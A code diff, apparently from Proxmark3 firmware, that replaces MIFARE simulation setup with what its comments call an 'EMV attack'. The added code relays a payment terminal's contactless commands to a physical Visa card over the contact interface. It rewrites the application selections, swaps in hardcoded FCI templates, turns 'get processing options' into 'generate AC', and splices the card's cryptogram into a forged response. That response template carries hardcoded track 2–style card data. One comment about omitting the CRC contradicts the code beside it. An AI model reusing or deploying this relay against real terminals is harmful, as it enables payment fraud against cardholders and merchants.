@@ -27,19 +27,13 @@
 //  /!\ Printing Debug message is disrupting emulation,
 //  Only use with caution during debugging
 
-// These are the old flags which have changed in master since this fork was created.
-// Just a temp fix and not intended to go into master
-#define FLAG_4B_UID_IN_DATA_OLD     0x02
-#define FLAG_7B_UID_IN_DATA_OLD     0x04
-#define FLAG_10B_UID_IN_DATA_OLD    0x08
-#define FLAG_UID_IN_EMUL_OLD        0x10
-#define FLAG_MF_MINI_OLD            0x80
-#define FLAG_MF_1K_OLD              0x100
-#define FLAG_MF_2K_OLD              0x200
-#define FLAG_MF_4K_OLD              0x400
-#define FLAG_FORCED_ATQA            0x800
-#define FLAG_FORCED_SAK             0x1000
-#define FLAG_CVE21_0430_OLD         0x2000
+// indices into responses array copied from mifare sim init:
+#define ATQA     0
+#define SAK      1
+#define SAKuid   2
+#define UIDBCC1  3
+#define UIDBCC2  8
+#define UIDBCC3  13
 
 #include "emvsim.h"
 #include <inttypes.h>
@@ -48,6 +42,7 @@
 #include "BigBuf.h"
 #include "string.h"
 #include "mifareutil.h"
+#include "mifaresim.h"
 #include "fpgaloader.h"
 #include "proxmark3_arm.h"
 #include "protocols.h"
@@ -57,322 +52,263 @@
 #include "ticks.h"
 #include "i2c_direct.h"
 
-#pragma GCC diagnostic ignored "-Wunused-variable"
-#pragma GCC diagnostic ignored "-Wunused-but-set-variable"
-#pragma GCC diagnostic ignored "-Wunused-function"
-
+// Hardcoded response to the reader for file not found, plus the checksum
 static uint8_t filenotfound[] = {0x02, 0x6a, 0x82, 0x93, 0x2f};
 
-// query and response that inserts PDOL so as to continue process...
-static uint8_t fci_query[] = {0x02, 0x00, 0xa4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00, 0x56, 0x3f};
-static uint8_t fci_template[] = {0x02, 0x6f, 0x5e, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x53, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x38, 0x18, 0x9f, 0x66, 0x04, 0x9f, 0x02, 0x06, 0x9f, 0x03, 0x06, 0x9f, 0x1a, 0x02, 0x95, 0x05, 0x5f, 0x2a, 0x02, 0x9a, 0x03, 0x9c, 0x01, 0x9f, 0x37, 0x04, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0xbf, 0x0c, 0x13, 0x9f, 0x5a, 0x05, 0x31, 0x08, 0x26, 0x08, 0x26, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0xd8, 0x15};
+// TLV response for PPSE directory request
+static uint8_t pay1_response[] = { 0x6F, 0x1E, 0x84, 0x0E };
 
-static uint8_t pay1_response[] = { 0x6F, 0x1E, 0x84, 0x0E, 0x31, 0x50, 0x41, 0x59 };
+// The WTX we want to send out... The format:
+// 0xf2 is the command
+// 0x0e is the time to wait (currently at max)
+// The remaining bytes are CRC, precalculated for speed
+static uint8_t extend_resp[] = {0xf2, 0x0e, 0x66, 0xb8};
+
+
+// For reference, we have here the pay1 template we receive from the card, and the pay2 template we send back to the reader
+// These can be inspected at https://emvlab.org/tlvutils/
+// Note that the pay2 template is coded for visa ps in the UK - other countries may have different templates. Refer:
+// https://mstcompany.net/blog/acquiring-emv-transaction-flow-part-3-get-processing-options-with-and-without-pdol
+// Specifically, 9F5A: Application Program Identifier: 3108260826 might have to become 31 0840 0840 for USA for example.
+// todo: see if this can be read from the card and automatically populated rather than hard coded
+//static uint8_t fci_template_pay1[] = {0xff, 0x6f, 0x3b, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x30, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x11, 0x01, 0x01, 0xbf, 0x0c, 0x0b, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x17, 0x48};
+static uint8_t fci_template_pay2[] = {0x02, 0x6f, 0x5e, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x53, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x38, 0x18, 0x9f, 0x66, 0x04, 0x9f, 0x02, 0x06, 0x9f, 0x03, 0x06, 0x9f, 0x1a, 0x02, 0x95, 0x05, 0x5f, 0x2a, 0x02, 0x9a, 0x03, 0x9c, 0x01, 0x9f, 0x37, 0x04, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0xbf, 0x0c, 0x13, 0x9f, 0x5a, 0x05, 0x31, 0x08, 0x26, 0x08, 0x26, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0xd8, 0x15};
+
+// This is the hardcoded response that a contactless card would respond with when asked to select PPSE.
+// It is a TLV structure, and can be seen here:
+// https://emvlab.org/tlvutils/?data=6f3e840e325041592e5359532e4444463031a52cbf0c2961274f07a0000000031010500a566973612044656269749f0a080001050100000000bf6304df200180
+// The first byte is the class byte, and the payload is followed by 0x9000, which is the success code, and the CRC (precalculated)
 static uint8_t pay2_response[] = { 0x03, 0x6f, 0x3e, 0x84, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0xa5, 0x2c, 0xbf, 0x0c, 0x29, 0x61, 0x27, 0x4f, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x63, 0x04, 0xdf, 0x20, 0x01, 0x80, 0x90, 0x00, 0x07, 0x9d};
 
-static bool MifareSimInit(uint16_t flags, uint8_t *datain, uint16_t atqa, uint8_t sak, tag_response_info_t **responses, uint32_t *cuid, uint8_t *uid_len, uint8_t **rats, uint8_t *rats_len) {
+void ExecuteEMVSim(uint8_t *receivedCmd, uint16_t receivedCmd_len, uint8_t *receivedCmd_copy, uint16_t receivedCmd_len_copy);
 
-    // SPEC: https://www.nxp.com/docs/en/application-note/AN10833.pdf
-    // ATQA
-    static uint8_t rATQA_Mini[]  = {0x04, 0x00};             // indicate Mifare classic Mini 4Byte UID
-    static uint8_t rATQA_1k[]    = {0x04, 0x00};             // indicate Mifare classic 1k 4Byte UID
-    static uint8_t rATQA_2k[]    = {0x04, 0x00};             // indicate Mifare classic 2k 4Byte UID
-    static uint8_t rATQA_4k[]    = {0x02, 0x00};             // indicate Mifare classic 4k 4Byte UID
+typedef enum {
+    STATE_DEFAULT,
+    SELECT_PAY1,
+    SELECT_PAY1_AID,
+    REQUESTING_CARD_PDOL,
+    GENERATE_AC,
+} SystemState;
 
-    // SAK
-    static uint8_t rSAK_Mini = 0x09;    // mifare Mini
-    static uint8_t rSAK_1k   = 0x08;    // mifare 1k
-    static uint8_t rSAK_2k   = 0x08;    // mifare 2k with RATS support
-    static uint8_t rSAK_4k   = 0x18;    // mifare 4k
+static SystemState currentState = STATE_DEFAULT;
 
-    static uint8_t rUIDBCC1[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 1st cascade level
-    static uint8_t rUIDBCC1b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 1st cascade level, last 4 bytes
-    static uint8_t rUIDBCC1b3[] = {0x00, 0x00, 0x00};               // UID 1st cascade level, last 3 bytes
-    static uint8_t rUIDBCC1b2[] = {0x00, 0x00};                     // UID 1st cascade level, last 2 bytes
-    static uint8_t rUIDBCC1b1[] = {0x00};                           // UID 1st cascade level, last byte
-    static uint8_t rUIDBCC2[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 2nd cascade level
-    static uint8_t rUIDBCC2b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 2st cascade level, last 4 bytes
-    static uint8_t rUIDBCC2b3[] = {0x00, 0x00, 0x00};               // UID 2st cascade level, last 3 bytes
-    static uint8_t rUIDBCC2b2[] = {0x00, 0x00};                     // UID 2st cascade level, last 2 bytes
-    static uint8_t rUIDBCC2b1[] = {0x00};                           // UID 2st cascade level, last byte
-    static uint8_t rUIDBCC3[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 3nd cascade level
-    static uint8_t rUIDBCC3b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 3st cascade level, last 4 bytes
-    static uint8_t rUIDBCC3b3[] = {0x00, 0x00, 0x00};               // UID 3st cascade level, last 3 bytes
-    static uint8_t rUIDBCC3b2[] = {0x00, 0x00};                     // UID 3st cascade level, last 2 bytes
-    static uint8_t rUIDBCC3b1[] = {0x00};                           // UID 3st cascade level, last byte
+// This is the main entry point for the EMV attack, everything before this has just been setup/handshaking.
+// In order to meet the timing requirements, as soon as the proxmark sees a command it immediately
+// caches the command to process and responds with a WTX
+// (waiting time extension). When it get the response to this WTX, it can process the cached command through the I2C interface.
+//
+// The full flow is:
+// 1. Handshake with RATS
+// 2. Reader attempts to find out which payment environment the proxmark supports (may start with SELECT OSE for example)
+// 3. Reader eventually makes a request for the PAY2 application (select PPSE) (contactless payment)
+// 4. We read the PAY1 environment and transform it into PAY2 to respond
+// 5. Reader will select AID we responded in step 4
+// 6. We get the response from selecting the PAY1 AID and transform it into PAY2 response (fci template)
+// - This is important as it contains the PDOL (processing data object list) which specifies the data which is
+//   signed by the card and sent to the reader to verify the transaction.
+// 7. The reader will then issue 'get processing options' which seems to be used here to provide the fields to be signed
+//    as specified by the PDOL.
+// 8. In contactless flow, GPO should at least return the Application Interchange Profile (AIP) and
+//    Application File Locator (AFL). However, here we return track 2 data, the cryptogram, everything. This completes the transaction.
+// 9. To construct this final response, behind the scenes we need to interact with the card to make it think its completing a contact transaction:
+//    - Request PDOL to prime the card (response not used)
+//    - Rearrange the GPO data provided into a 'generate AC' command for the card
+//    - Extract the cryptogram, track 2 data and anything else required
+//    - Respond. Transaction is complete
+void ExecuteEMVSim(uint8_t *receivedCmd, uint16_t receivedCmd_len, uint8_t *receivedCmd_copy, uint16_t receivedCmd_len_copy) {
+    uint8_t responseToReader[MAX_FRAME_SIZE] = {0x00};
+    uint16_t responseToReader_len;
 
-    static uint8_t rATQA[]     = {0x00, 0x00};             // Current ATQA
-    static uint8_t rSAK[]      = {0x00, 0x00, 0x00};       // Current SAK, CRC
-    static uint8_t rSAKuid[]   = {0x04, 0xda, 0x17};       // UID incomplete cascade bit, CRC
+    // special print me
+    Dbprintf("\nrecvd from reader:");
+    Dbhexdump(receivedCmd_len, receivedCmd, false);
+    Dbprintf("");
 
-    // RATS answer for 2K NXP mifare classic (with CRC)
-    static uint8_t rRATS[]     = {0x0c, 0x75, 0x77, 0x80, 0x02, 0xc1, 0x05, 0x2f, 0x2f, 0x01, 0xbc, 0xd6, 0x60, 0xd3};
+    // use annotate to give some hints about the command
+    annotate(&receivedCmd[1], receivedCmd_len-1);
 
-    *uid_len = 0;
+    // This is a common request from the reader which we can just immediately respond to since we know we can't
+    // handle it.
+    if (receivedCmd[6] == 'O' && receivedCmd[7] == 'S' && receivedCmd[8] == 'E') {
+        Dbprintf("We saw OSE... ignore it!");
+        EmSendCmd(filenotfound, sizeof(filenotfound));
+        return;
+    }
 
-    // By default use 1K tag
-    memcpy(rATQA, rATQA_1k, sizeof(rATQA));
-    rSAK[0] = rSAK_1k;
+    // We want to modify corrupted request
+    if ((receivedCmd_len > 5 && receivedCmd[0] != 0x03 && receivedCmd[0] != 0x02 && receivedCmd[1] == 0 && receivedCmd[4] == 0) || (receivedCmd[2] == 0xa8)) {
+        Dbprintf("We saw signing request... modifying it into a generate ac transaction !!!!");
 
-    //by default RATS not supported
-    *rats_len = 0;
-    *rats = NULL;
+        currentState = GENERATE_AC;
 
-    // -- Determine the UID
-    // Can be set from emulator memory or incoming data
-    // Length: 4,7,or 10 bytes
+        memcpy(receivedCmd, (unsigned char[]){ 0x03, 0x80, 0xae, 0x80, 0x00, 0x1d }, 6);
 
-    // Get UID, SAK, ATQA from EMUL
-    if ((flags & FLAG_UID_IN_EMUL_OLD) == FLAG_UID_IN_EMUL_OLD) {
-        uint8_t block0[16];
-        emlGet(block0, 0, 16);
+        for (int i = 0; i < 29; i++) {
+            receivedCmd[6 + i] = receivedCmd[12 + i];
+        }
 
-        // If uid size defined, copy only uid from EMUL to use, backward compatibility for 'hf_colin.c', 'hf_mattyrun.c'
-        if ((flags & (FLAG_4B_UID_IN_DATA_OLD | FLAG_7B_UID_IN_DATA_OLD | FLAG_10B_UID_IN_DATA_OLD)) != 0) {
-            memcpy(datain, block0, 10);  // load 10bytes from EMUL to the datain pointer. to be used below.
-        } else {
-            // Check for 4 bytes uid: bcc corrected and single size uid bits in ATQA
-            if ((block0[0] ^ block0[1] ^ block0[2] ^ block0[3]) == block0[4] && (block0[6] & 0xc0) == 0) {
-                flags |= FLAG_4B_UID_IN_DATA_OLD;
-                memcpy(datain, block0, 4);
-                rSAK[0] = block0[5];
-                memcpy(rATQA, &block0[6], sizeof(rATQA));
+        // clear final byte just in case
+        receivedCmd[35] = 0;
+
+        receivedCmd_len = 35 + 3; // Core command is 35, then there is control code and the crc
+
+        Dbprintf("\nthe command has now become:");
+        Dbhexdump(receivedCmd_len, receivedCmd, false);
+    }
+
+    // Seems unlikely
+    if (receivedCmd_len >= 9 && receivedCmd[6] == '1' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
+        Dbprintf("We saw 1PA... !!!!");
+    }
+
+    // Request more time for 2PAY and respond with a modified 1PAY request. We literally just change the 2 to a 1.
+    if (receivedCmd_len >= 9 && receivedCmd[6] == '2' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
+        Dbprintf("We saw 2PA... switching it to 1PAY !!!!");
+        receivedCmd[6] = '1';
+        currentState = SELECT_PAY1;
+    }
+
+    // We are selecting a short AID - assume it is pay2 aid
+    if (receivedCmd[2] == 0xA4 && receivedCmd[5] == 0x07) {
+        Dbprintf("Selecting pay2 AID");
+        currentState = SELECT_PAY1_AID;
+    }
+
+    static uint8_t rnd_resp[] = {0xb2, 0x67, 0xc7};
+    if (memcmp(receivedCmd, rnd_resp, sizeof(rnd_resp)) == 0) {
+        Dbprintf("We saw bad response... !");
+        return;
+    }
+
+    // We have received the response from a WTX command! Process the cached command at this point.
+    if (memcmp(receivedCmd, extend_resp, sizeof(extend_resp)) == 0) {
+        // Special case: if we are about to do a generate AC, we also need to
+        // make a request for pdol first (and discard response)...
+        if (receivedCmd_copy[1] == 0x80 && receivedCmd_copy[2] == 0xae) {
+            Dbprintf("We are about to do a generate AC... we need to request PDOL first...");
+            uint8_t pdol_request[] = { 0x80, 0xa8, 0x00, 0x00, 0x02, 0x83, 0x00 };
+
+            currentState = REQUESTING_CARD_PDOL;
+            CmdSmartRaw(0xff, &(pdol_request[0]), sizeof(pdol_request), (&responseToReader[0]), &responseToReader_len);
+        }
+
+        // Send the cached command to the card via ISO7816
+        // This is minus 3 because we don't include the first byte (prepend), plus we don't want to send the
+        // last two bytes (CRC) to the card.
+        // On the return, the first class byte must be the same, so it's preserved in responseToReader
+        CmdSmartRaw(receivedCmd_copy[0], &(receivedCmd_copy[1]), receivedCmd_len_copy - 3, (&responseToReader[0]), &responseToReader_len);
+
+        // Print the unadultered response we got from the card here
+        Dbprintf("The response from the card is ==> :");
+        Dbhexdump(responseToReader_len, responseToReader, false);
+
+        // We have passed the reader's query to the card, but before we return it, we need to check if we need to modify
+        // the response to 'pretend' to be a PAY2 environment.
+        // This is always the same response for VISA, the only currently supported card
+        if (currentState == SELECT_PAY1) {
+            Dbprintf("We saw a PAY1 response... modifying it to a PAY2 response !!!!");
+
+            if (!memcmp(&responseToReader[1], &pay1_response[0], sizeof(pay1_response)) == 0) {
+                Dbprintf("The response from the card is not a PAY1 response. This is unexpected and probably fatal.");
             }
-            // Check for 7 bytes UID: double size uid bits in ATQA
-            else if ((block0[8] & 0xc0) == 0x40) {
-                flags |= FLAG_7B_UID_IN_DATA_OLD;
-                memcpy(datain, block0, 7);
-                rSAK[0] = block0[7];
-                memcpy(rATQA, &block0[8], sizeof(rATQA));
-            } else {
-                Dbprintf("ERROR: " _RED_("Invalid dump. UID/SAK/ATQA not found"));
-                return false;
+
+            if (pay2_response[0] != responseToReader[0]) {
+                Dbprintf("The first byte of the PAY2 response is different from the request. This is unexpected and probably fatal.");
             }
+
+            memcpy(responseToReader, &pay2_response[0], sizeof(pay2_response));
+            responseToReader_len = sizeof(pay2_response);
         }
 
-    }
+        if (responseToReader[0] != 0xff && responseToReader[1] == 0x77 && true) {
+            Dbprintf("we have detected a generate ac response, lets repackage it!!");
+            Dbhexdump(responseToReader_len, responseToReader, false); // special print
 
-    // Tune tag type, if defined directly
-    // Otherwise use defined by default or extracted from EMUL
-    if ((flags & FLAG_MF_MINI_OLD) == FLAG_MF_MINI_OLD) {
-        memcpy(rATQA, rATQA_Mini, sizeof(rATQA));
-        rSAK[0] = rSAK_Mini;
-        if (g_dbglevel > DBG_NONE) Dbprintf("Enforcing Mifare Mini ATQA/SAK");
-    } else if ((flags & FLAG_MF_1K_OLD) == FLAG_MF_1K_OLD) {
-        memcpy(rATQA, rATQA_1k, sizeof(rATQA));
-        rSAK[0] = rSAK_1k;
-        if (g_dbglevel > DBG_NONE) Dbprintf("Enforcing Mifare 1K ATQA/SAK (!!!!)");
-    } else if ((flags & FLAG_MF_2K_OLD) == FLAG_MF_2K_OLD) {
-        memcpy(rATQA, rATQA_2k, sizeof(rATQA));
-        rSAK[0] = rSAK_2k;
-        *rats = rRATS;
-        *rats_len = sizeof(rRATS);
-        if (g_dbglevel > DBG_NONE) Dbprintf("Enforcing Mifare 2K ATQA/SAK with RATS support");
-    } else if ((flags & FLAG_MF_4K_OLD) == FLAG_MF_4K_OLD) {
-        memcpy(rATQA, rATQA_4k, sizeof(rATQA));
-        rSAK[0] = rSAK_4k;
-        if (g_dbglevel > DBG_NONE) Dbprintf("Enforcing Mifare 4K ATQA/SAK");
-    }
+            // 11 and 12 are trans counter.
+            // 16 to 24 are the cryptogram
+            // 27 to 34 is issuer application data
+            Dbprintf("atc: %d %d, cryptogram: %d ", responseToReader[11], responseToReader[12], responseToReader[13]);
 
-    // Prepare UID arrays
-    if ((flags & FLAG_4B_UID_IN_DATA_OLD) == FLAG_4B_UID_IN_DATA_OLD) { // get UID from datain
-        memcpy(rUIDBCC1, datain, 4);
-        *uid_len = 4;
-        if (g_dbglevel >= DBG_EXTENDED)
-            Dbprintf("MifareSimInit - FLAG_4B_UID_IN_DATA_OLD => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_4B_UID_IN_DATA_OLD, flags, rUIDBCC1);
+            // then, on the template:
+            // 60 and 61 for counter
+            // 45 to 53 for cryptogram
+            // 35 to 42 for issuer application data
+            uint8_t template[] = { 0x00, 0x77, 0x47, 0x82, 0x02, 0x39, 0x00, 0x57, 0x13, 0x47,
+                                   0x62, 0x28, 0x00, 0x05, 0x93, 0x38, 0x64, 0xd2, 0x70, 0x92,
+                                   0x01, 0x00, 0x00, 0x01, 0x42, 0x00, 0x00, 0x0f, 0x5f, 0x34,
+                                   0x01, 0x00, 0x9f, 0x10, 0x07, 0x06, 0x01, 0x12, 0x03, 0xa0,
+                                   0x20, 0x00, 0x9f, 0x26, 0x08, 0x56, 0xcb, 0x4e, 0xe1, 0xa4,
+                                   0xef, 0xac, 0x74, 0x9f, 0x27, 0x01, 0x80, 0x9f, 0x36, 0x02,
+                                   0x00, 0x07, 0x9f, 0x6c, 0x02, 0x3e, 0x00, 0x9f, 0x6e, 0x04,
+                                   0x20, 0x70, 0x00, 0x00, 0x90, 0x00, 0xff, 0xff};
 
-        // save CUID
-        *cuid = bytes_to_num(rUIDBCC1, 4);
-        // BCC
-        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
-        if (g_dbglevel > DBG_NONE) {
-            Dbprintf("4B UID: %02x%02x%02x%02x", rUIDBCC1[0], rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3]);
+            // do the replacement
+            template[0] = responseToReader[0]; // class bit 0
+
+            template[60] = responseToReader[10];
+            template[61] = responseToReader[11];
+
+            // Copy responseToReader[15..23] to template[45..53]
+            for (int i = 0; i <= 8; i++) {
+                template[45 + i] = responseToReader[15 + i];
+            }
+
+            // Copy responseToReader[26..32] to template[35..41]
+            for (int i = 0; i <= 6; i++) {
+                template[35 + i] = responseToReader[26 + i];
+            }
+
+            Dbprintf("\nrearranged is: ");
+            responseToReader_len = sizeof(template);
+
+            // We DO NOT add the CRC here, this way we can avoid a million penny payments!
+            // The CRC is calculated here, but doesn't include the class bit at the beginning, plus
+            // also obvisously doesn't include the CRC bytes itself.
+            AddCrc14A(&template[0], responseToReader_len - 2);
+
+            responseToReader_len = sizeof(template);
+            memcpy(responseToReader, &template[0], responseToReader_len);
+
+            Dbprintf("\nafter crc rearranged is: ");
+            Dbhexdump(responseToReader_len, &responseToReader[0], false); // special print
         }
 
-        // Correct uid size bits in ATQA
-        rATQA[0] = (rATQA[0] & 0x3f) | 0x00; // single size uid
-
-    } else if ((flags & FLAG_7B_UID_IN_DATA_OLD) == FLAG_7B_UID_IN_DATA_OLD) {
-        memcpy(&rUIDBCC1[1], datain, 3);
-        memcpy(rUIDBCC2, datain + 3, 4);
-        *uid_len = 7;
-        if (g_dbglevel >= DBG_EXTENDED)
-            Dbprintf("MifareSimInit - FLAG_7B_UID_IN_DATA_OLD => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_7B_UID_IN_DATA_OLD, flags, rUIDBCC1);
-
-        // save CUID
-        *cuid = bytes_to_num(rUIDBCC2, 4);
-        // CascadeTag, CT
-        rUIDBCC1[0] = MIFARE_SELECT_CT;
-        // BCC
-        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
-        rUIDBCC2[4] = rUIDBCC2[0] ^ rUIDBCC2[1] ^ rUIDBCC2[2] ^ rUIDBCC2[3];
-        if (g_dbglevel > DBG_NONE) {
-            Dbprintf("7B UID: %02x %02x %02x %02x %02x %02x %02x",
-                     rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3], rUIDBCC2[0], rUIDBCC2[1], rUIDBCC2[2], rUIDBCC2[3]);
+        // If we would return a PAY1 fci response, we instead return a PAY2 fci response
+        if (currentState == SELECT_PAY1_AID) {
+            Dbprintf("We saw a PAY1 response... modifying it to a PAY2 response for outgoing !!!!");
+            memcpy(responseToReader, fci_template_pay2, sizeof(fci_template_pay2));
+            responseToReader_len = sizeof(fci_template_pay2);
         }
 
-        // Correct uid size bits in ATQA
-        rATQA[0] = (rATQA[0] & 0x3f) | 0x40; // double size uid
+        EmSendCmd(responseToReader, responseToReader_len);
 
-    } else if ((flags & FLAG_10B_UID_IN_DATA_OLD) == FLAG_10B_UID_IN_DATA_OLD) {
-        memcpy(&rUIDBCC1[1], datain,   3);
-        memcpy(&rUIDBCC2[1], datain + 3, 3);
-        memcpy(rUIDBCC3,    datain + 6, 4);
-        *uid_len = 10;
-        if (g_dbglevel >= DBG_EXTENDED)
-            Dbprintf("MifareSimInit - FLAG_10B_UID_IN_DATA_OLD => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_10B_UID_IN_DATA_OLD, flags, rUIDBCC1);
-
-        // save CUID
-        *cuid = bytes_to_num(rUIDBCC3, 4);
-        // CascadeTag, CT
-        rUIDBCC1[0] = MIFARE_SELECT_CT;
-        rUIDBCC2[0] = MIFARE_SELECT_CT;
-        // BCC
-        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
-        rUIDBCC2[4] = rUIDBCC2[0] ^ rUIDBCC2[1] ^ rUIDBCC2[2] ^ rUIDBCC2[3];
-        rUIDBCC3[4] = rUIDBCC3[0] ^ rUIDBCC3[1] ^ rUIDBCC3[2] ^ rUIDBCC3[3];
-
-        if (g_dbglevel > DBG_NONE) {
-            Dbprintf("10B UID: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
-                     rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3],
-                     rUIDBCC2[1], rUIDBCC2[2], rUIDBCC2[3],
-                     rUIDBCC3[0], rUIDBCC3[1], rUIDBCC3[2], rUIDBCC3[3]
-                    );
-        }
-
-        // Correct uid size bits in ATQA
-        rATQA[0] = (rATQA[0] & 0x3f) | 0x80; // triple size uid
-    } else {
-        Dbprintf("ERROR: " _RED_("UID size not defined"));
-        return false;
+        return;
     }
 
-    if (flags & FLAG_FORCED_ATQA) {
-        rATQA[0] = atqa >> 8;
-        rATQA[1] = atqa & 0xff;
-    }
-    if (flags & FLAG_FORCED_SAK) {
-        rSAK[0] = sak;
-    }
-
-    if (g_dbglevel > DBG_NONE) {
-        Dbprintf("ATQA  : %02X %02X", rATQA[1], rATQA[0]);
-        Dbprintf("SAK   : %02X", rSAK[0]);
-    }
-
-    // clone UIDs for byte-frame anti-collision multiple tag selection procedure
-    memcpy(rUIDBCC1b4, &rUIDBCC1[1], 4);
-    memcpy(rUIDBCC1b3, &rUIDBCC1[2], 3);
-    memcpy(rUIDBCC1b2, &rUIDBCC1[3], 2);
-    memcpy(rUIDBCC1b1, &rUIDBCC1[4], 1);
-    if (*uid_len >= 7) {
-        memcpy(rUIDBCC2b4, &rUIDBCC2[1], 4);
-        memcpy(rUIDBCC2b3, &rUIDBCC2[2], 3);
-        memcpy(rUIDBCC2b2, &rUIDBCC2[3], 2);
-        memcpy(rUIDBCC2b1, &rUIDBCC2[4], 1);
-    }
-    if (*uid_len == 10) {
-        memcpy(rUIDBCC3b4, &rUIDBCC3[1], 4);
-        memcpy(rUIDBCC3b3, &rUIDBCC3[2], 3);
-        memcpy(rUIDBCC3b2, &rUIDBCC3[3], 2);
-        memcpy(rUIDBCC3b1, &rUIDBCC3[4], 1);
-    }
-
-    // Calculate actual CRC
-    AddCrc14A(rSAK, sizeof(rSAK) - 2);
-
-#define TAG_RESPONSE_COUNT 18
-    static tag_response_info_t responses_init[TAG_RESPONSE_COUNT] = {
-        { .response = rATQA,     .response_n = sizeof(rATQA)     },     // Answer to request - respond with card type
-        { .response = rSAK,      .response_n = sizeof(rSAK)      },     //
-        { .response = rSAKuid,   .response_n = sizeof(rSAKuid)   },     //
-        // Do not reorder. Block used via relative index of rUIDBCC1
-        { .response = rUIDBCC1,  .response_n = sizeof(rUIDBCC1)  },     // Anticollision cascade1 - respond with first part of uid
-        { .response = rUIDBCC1b4, .response_n = sizeof(rUIDBCC1b4)},
-        { .response = rUIDBCC1b3, .response_n = sizeof(rUIDBCC1b3)},
-        { .response = rUIDBCC1b2, .response_n = sizeof(rUIDBCC1b2)},
-        { .response = rUIDBCC1b1, .response_n = sizeof(rUIDBCC1b1)},
-        // Do not reorder. Block used via relative index of rUIDBCC2
-        { .response = rUIDBCC2,  .response_n = sizeof(rUIDBCC2)  },     // Anticollision cascade2 - respond with 2nd part of uid
-        { .response = rUIDBCC2b4, .response_n = sizeof(rUIDBCC2b4)},
-        { .response = rUIDBCC2b3, .response_n = sizeof(rUIDBCC2b3)},
-        { .response = rUIDBCC2b2, .response_n = sizeof(rUIDBCC2b2)},
-        { .response = rUIDBCC2b1, .response_n = sizeof(rUIDBCC2b1)},
-        // Do not reorder. Block used via relative index of rUIDBCC3
-        { .response = rUIDBCC3,  .response_n = sizeof(rUIDBCC3)  },     // Anticollision cascade3 - respond with 3th part of uid
-        { .response = rUIDBCC3b4, .response_n = sizeof(rUIDBCC3b4)},
-        { .response = rUIDBCC3b3, .response_n = sizeof(rUIDBCC3b3)},
-        { .response = rUIDBCC3b2, .response_n = sizeof(rUIDBCC3b2)},
-        { .response = rUIDBCC3b1, .response_n = sizeof(rUIDBCC3b1)}
-    };
-
-    // Prepare ("precompile") the responses of the anticollision phase.
-    // There will be not enough time to do this at the moment the reader sends its REQA or SELECT
-    // There are 18 predefined responses with a total of 53 bytes data to transmit.
-    // Coded responses need one byte per bit to transfer (data, parity, start, stop, correction)
-    // 53 * 8 data bits, 53 * 1 parity bits, 18 start bits, 18 stop bits, 18 correction bits  ->   need 571 bytes buffer
-#define ALLOCATED_TAG_MODULATION_BUFFER_SIZE 571
-
-    uint8_t *free_buffer = BigBuf_malloc(ALLOCATED_TAG_MODULATION_BUFFER_SIZE);
-    // modulation buffer pointer and current buffer free space size
-    uint8_t *free_buffer_pointer = free_buffer;
-    size_t free_buffer_size = ALLOCATED_TAG_MODULATION_BUFFER_SIZE;
-
-    for (size_t i = 0; i < TAG_RESPONSE_COUNT; i++) {
